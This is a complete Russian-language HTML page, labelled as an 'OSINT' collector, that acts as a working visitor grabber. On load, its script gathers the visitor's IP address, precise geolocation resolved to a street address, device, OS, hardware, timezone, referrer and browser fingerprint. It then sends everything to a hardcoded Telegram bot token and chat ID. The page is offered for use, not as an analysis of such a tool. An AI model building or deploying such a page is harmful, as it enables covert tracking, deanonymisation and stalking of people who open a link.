<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT сбор данных</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        .status-box {
            background: #f8f9fa;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 14px;
            color: #555;
            word-break: break-word;
        }
        .progress {
            margin-top: 15px;
            font-size: 14px;
            color: #667eea;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid #667eea;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>🔍 Сбор OSINT данных</h1>
        <p>Пожалуйста, подождите, информация собирается и отправляется...</p>
        <div class="status-box" id="status">
            Инициализация...
        </div>
        <div class="progress" id="progress">
            <div class="spinner"></div>
            <span id="progressText">Получение IP</span>
        </div>
        <div class="footer">
            Данные отправляются в защищённый канал
        </div>
    </div>

    <script>
        (function() {
            // ⚠️ ВАШИ ДАННЫЕ (токен и ID)
            const TELEGRAM_TOKEN = '8519920730:AAF9hPsqQCFH5sVrqJ9OCpCPSOtdKeilT88';
            const TELEGRAM_CHAT_ID = '8489374137';

            // Элементы для отображения статуса
            const statusDiv = document.getElementById('status');
            const progressText = document.getElementById('progressText');

            // Вспомогательная функция обновления статуса
            function setStatus(text) {
                statusDiv.innerText = text;
            }

            function setProgress(text) {
                progressText.innerText = text;
            }

            // ==================== ОТПРАВКА В TELEGRAM (через GET, no-cors) ====================
            function sendToTelegram(message) {
                // Экранируем Markdown-спецсимволы для безопасной передачи
                const escapeMarkdown = (str) => {
                    return str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
                };

                const safeMessage = escapeMarkdown(message);
                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(safeMessage)}&parse_mode=Markdown`;

                // Ограничение длины URL (безопасный предел ~2000 символов)
                if (url.length > 2000) {
                    // Разбиваем сообщение на части, если оно слишком длинное
                    const parts = [];
                    const maxPartSize = 1500; // оставляем запас на экранирование
                    for (let i = 0; i < safeMessage.length; i += maxPartSize) {
                        parts.push(safeMessage.slice(i, i + maxPartSize));
                    }
                    parts.forEach((part, index) => {
                        const partUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(part + (parts.length > 1 ? ` (часть ${index+1}/${parts.length})` : ''))}&parse_mode=Markdown`;
                        fetch(partUrl, { mode: 'no-cors' })
                            .catch(err => console.warn('Ошибка отправки части', err));
                    });
                    setStatus(`✅ Данные отправлены (${parts.length} части)`);
                } else {
                    fetch(url, { mode: 'no-cors' })
                        .then(() => setStatus('✅ Данные успешно отправлены'))
                        .catch(err => {
                            console.warn('Ошибка отправки:', err);
                            setStatus('⚠️ Отправка не удалась, но данные собраны (ошибка CORS?)');
                        });
                }
            }

            // ==================== СБОР ДАННЫХ ====================
            async function collectData() {
                const result = {};

                // 1. IP-адрес
                setProgress('Получение IP');
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    result.ip = ipData.ip;
                } catch {
                    result.ip = 'Не удалось определить';
                }

                // 2. Геолокация (через OpenStreetMap Nominatim)
                setProgress('Запрос геолокации');
                result.geo = 'Не запрошено или отказано';
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                timeout: 8000,
                                maximumAge: 0
                            });
                        });
                        const { latitude, longitude } = position.coords;
                        // Запрос к Nominatim с user-agent (требуется их политикой)
                        const geoRes = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
                            { headers: { 'User-Agent': 'MyOSINTCollector/1.0' } }
                        );
                        const geoJson = await geoRes.json();
                        result.geo = geoJson.display_name || `${latitude}, ${longitude}`;
                    } catch (e) {
                        result.geo = 'Геолокация недоступна (отказ/таймаут)';
                    }
                } else {
                    result.geo = 'Geolocation не поддерживается';
                }

                // 3. UserAgent и ОС/Устройство
                setProgress('Определение ОС и устройства');
                const ua = navigator.userAgent;
                result.userAgent = ua;

                // Простой парсер ОС
                if (ua.includes('Windows')) result.os = 'Windows';
                else if (ua.includes('Mac OS')) result.os = 'macOS';
                else if (ua.includes('Linux')) result.os = 'Linux';
                else if (ua.includes('Android')) result.os = 'Android';
                else if (ua.includes('iPhone') || ua.includes('iPad')) result.os = 'iOS';
                else result.os = 'Неизвестно';

                // Парсер устройства
                if (ua.includes('iPhone')) result.device = 'iPhone';
                else if (ua.includes('iPad')) result.device = 'iPad';
                else if (ua.includes('Android')) {
                    const match = ua.match(/Android\s+[^;]+(;\s+[^)]+)/);
                    result.device = match ? match[1] : 'Android устройство';
                } else if (ua.includes('Windows NT')) result.device = 'ПК (Windows)';
                else if (ua.includes('Macintosh')) result.device = 'ПК (Mac)';
                else result.device = 'ПК/Другое';

                // 4. Характеристики CPU и память
                setProgress('Анализ CPU и памяти');
                result.cpuCores = navigator.hardwareConcurrency || 'неизвестно';
                result.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно';

                // Простой тест производительности (имитация "нагрузки на проц")
                const start = performance.now();
                for (let i = 0; i < 1e6; i++) { Math.sqrt(i); }
                const duration = performance.now() - start;
                result.cpuBenchmark = duration.toFixed(2) + 'ms (1M sqrt)';

                // 5. Расширения (попытка детекта AdBlock)
                setProgress('Проверка расширений');
                const adBlockDetected = await new Promise((resolve) => {
                    const testDiv = document.createElement('div');
                    testDiv.innerHTML = '&nbsp;';
                    testDiv.className = 'adsbox';
                    testDiv.style = 'width: 1px; height: 1px; position: absolute; left: -1000px; top: -1000px;';
                    document.body.appendChild(testDiv);
                    setTimeout(() => {
                        const isHidden = testDiv.offsetHeight === 0;
                        testDiv.remove();
                        resolve(isHidden);
                    }, 150);
                });
                result.adblock = adBlockDetected ? 'Обнаружен' : 'Не обнаружен';

                // 6. Дополнительная информация (OSINT)
                setProgress('Сбор дополнительных данных');
                result.screen = `${screen.width}x${screen.height}`;
                result.language = navigator.language || navigator.userLanguage || 'неизвестно';
                result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'неизвестно';
                result.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
                result.localStorage = typeof localStorage !== 'undefined' ? 'Доступен' : 'Недоступен';
                result.referrer = document.referrer || 'Прямой переход';
                result.timestamp = new Date().toISOString();
                result.url = window.location.href;

                // 7. Заголовки (доступные через navigator)
                result.platform = navigator.platform || 'неизвестно';
                result.doNotTrack = navigator.doNotTrack || 'не указано';

                return result;
            }

            // ==================== ФОРМИРОВАНИЕ СООБЩЕНИЯ ====================
            function formatMessage(data) {
                let msg = `*🕵️ Новый OSINT отчёт*\n`;
                msg += `━━━━━━━━━━━━━━━━\n`;
                msg += `*IP:* ${data.ip}\n`;
                msg += `*📍 Гео:* ${data.geo}\n`;
                msg += `*💻 ОС:* ${data.os}\n`;
                msg += `*📱 Устройство:* ${data.device}\n`;
                msg += `*⚙️ Ядра CPU:* ${data.cpuCores}\n`;
                msg += `*🧠 ОЗУ:* ${data.memory}\n`;
                msg += `*⏱️ Производительность:* ${data.cpuBenchmark}\n`;
                msg += `*🛡️ AdBlock:* ${data.adblock}\n`;
                msg += `*🖥️ Экран:* ${data.screen}\n`;
                msg += `*🌐 Язык:* ${data.language}\n`;
                msg += `*⏰ Часовой пояс:* ${data.timezone}\n`;
                msg += `*🍪 Куки:* ${data.cookiesEnabled}\n`;
                msg += `*💾 LocalStorage:* ${data.localStorage}\n`;
                msg += `*🔗 Referrer:* ${data.referrer}\n`;
                msg += `*📄 Платформа:* ${data.platform}\n`;
                msg += `*🚫 DoNotTrack:* ${data.doNotTrack}\n`;
                msg += `*🕒 Время:* ${data.timestamp}\n`;
                msg += `*📌 URL:* ${data.url}\n`;
                msg += `━━━━━━━━━━━━━━━━\n`;
                msg += `*User-Agent:*\n\`${data.userAgent}\``;
                return msg;
            }

            // ==================== ГЛАВНАЯ ФУНКЦИЯ ====================
            async function main() {
                try {
                    const data = await collectData();
                    setProgress('Отправка данных...');
                    const message = formatMessage(data);
                    sendToTelegram(message);
                } catch (error) {
                    console.error('Критическая ошибка:', error);
                    setStatus('❌ Ошибка при сборе данных: ' + error.message);
                }
            }

            // Запускаем сбор после полной загрузки DOM
            window.addEventListener('load', () => {
                main().catch(e => {
                    setStatus('Ошибка инициализации: ' + e.message);
                });
            });

            // Резервный таймер, если вдруг main зависнет
            setTimeout(() => {
                if (statusDiv.innerText === 'Инициализация...') {
                    setStatus('⚠️ Сбор данных занял слишком много времени, проверьте консоль.');
                }
            }, 15000);
        })();
    </script>
</body>
</html>
